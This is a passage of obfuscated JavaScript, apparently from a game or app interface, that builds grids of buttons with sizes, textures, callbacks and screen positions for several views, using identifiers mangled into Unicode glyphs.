			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ΔⵠⲆᐃΔ, 159, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ⲆᐃⲆᐃᐃᐃΔ, ⲆΔ.ᐃᐃᐃΔᐃᐃΔ, ⲆΔ.ⲆᐃⵠᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -61, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ᐃⲆⵠΔⲆΔᐃ, ⲆΔ.ⵠΔΔΔΔⲆⲆ, ⲆΔ.ΔⲆᐃΔⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 260, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -320, 470, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠΔⵠ;
			ⵠΔⵠΔⵠΔⵠⵠΔ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -29, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃⵠᐃⵠᐃ, -29, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃᐃⵠⵠΔ, -29, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⵠᐃⲆⲆ, 65, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ΔΔΔⲆΔ, 65, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⲆⲆⵠⵠ, 65, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ΔΔΔⲆΔ, 159, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆΔⵠⲆⵠ, 159, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⲆⲆⵠⵠ, 159, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ⲆᐃⲆᐃᐃᐃΔ, ⲆΔ.ᐃᐃᐃΔᐃᐃΔ, ⲆΔ.ⲆᐃⵠᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -61, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ᐃⲆⵠΔⲆΔᐃ, ⲆΔ.ⵠΔΔΔΔⲆⲆ, ⲆΔ.ΔⲆᐃΔⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃᐃⵠⵠΔ, 260, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -320, 470, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃΔⵠᐃⲆ;
			ⵠⵠⵠⲆⵠΔᐃΔΔ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆΔⵠⲆⵠ, -29, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -29, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -29, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ΔⵠⲆᐃΔ, 65, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⵠᐃⵠⲆΔ, 65, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 65, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 159, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆΔⵠⲆⵠ, 159, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 159, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ⲆᐃⲆᐃᐃᐃΔ, ⲆΔ.ᐃᐃᐃΔᐃᐃΔ, ⲆΔ.ⲆᐃⵠᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -61, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ᐃⲆⵠΔⲆΔᐃ, ⲆΔ.ⵠΔΔΔΔⲆⲆ, ⲆΔ.ΔⲆᐃΔⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⵠⵠΔⵠΔ, 260, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -320, 470, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⵠᐃΔⲆΔ;
			ΔⲆⲆⵠⲆⲆᐃᐃⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -29, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆΔⵠⲆⲆ, -29, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -29, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⵠΔᐃⲆΔ, 65, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃᐃⵠᐃᐃ, 65, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆΔΔΔⲆ, 65, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⵠᐃⲆⲆ, 159, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆΔΔΔⲆ, 159, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 159, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ⲆᐃⲆᐃᐃᐃΔ, ⲆΔ.ᐃᐃᐃΔᐃᐃΔ, ⲆΔ.ⲆᐃⵠᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃⵠᐃⵠᐃ, -61, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ᐃⲆⵠΔⲆΔᐃ, ⲆΔ.ⵠΔΔΔΔⲆⲆ, ⲆΔ.ΔⲆᐃΔⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 260, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -320, 470, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ⲆⵠΔⲆⵠ;
			ⵠᐃᐃΔⲆΔΔⵠⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⲆⲆⲆᐃ, -29, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -29, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⵠΔᐃⲆΔ, -29, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 65, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⵠⵠᐃᐃᐃ, 65, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃⵠᐃⵠᐃ, 65, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃᐃⵠᐃᐃ, 159, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆᐃΔⲆᐃ, 159, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 159, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ⲆᐃⲆᐃᐃᐃΔ, ⲆΔ.ᐃᐃᐃΔᐃᐃΔ, ⲆΔ.ⲆᐃⵠᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -61, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ᐃⲆⵠΔⲆΔᐃ, ⲆΔ.ⵠΔΔΔΔⲆⲆ, ⲆΔ.ΔⲆᐃΔⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃⵠᐃⵠᐃ, 260, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(115, 73, "", [ⲆΔ.ⲆⵠᐃⲆᐃ, ⲆΔ.ᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠⵠΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆΔᐃⵠ(ⲆΔⵠⵠΔ)
			}), -320, 470, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆΔⲆΔ;
			ⲆⵠⲆΔᐃΔΔⵠⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⲆⲆⵠⵠ, -29, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ᐃⲆᐃⲆⲆ, -29, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⲆⲆⲆⵠⵠ, -29, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 65, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 65, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 65, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ⵠᐃⵠⲆΔ, 159, 205, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, ΔΔⵠᐃΔ, 159, 300, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(178, 182, "", [ⲆΔ.ⲆᐃⵠⲆ, ⲆΔ.ᐃΔⵠΔ, ⲆΔ.ⵠⲆΔⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, 159, 395, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(39, 122, "", [ⲆΔ.ⲆᐃⲆᐃᐃᐃΔ, ⲆΔ.ᐃᐃᐃΔᐃᐃΔ, ⲆΔ.ⲆᐃⵠᐃⵠⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -61, 315, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃⵠⲆⵠ;
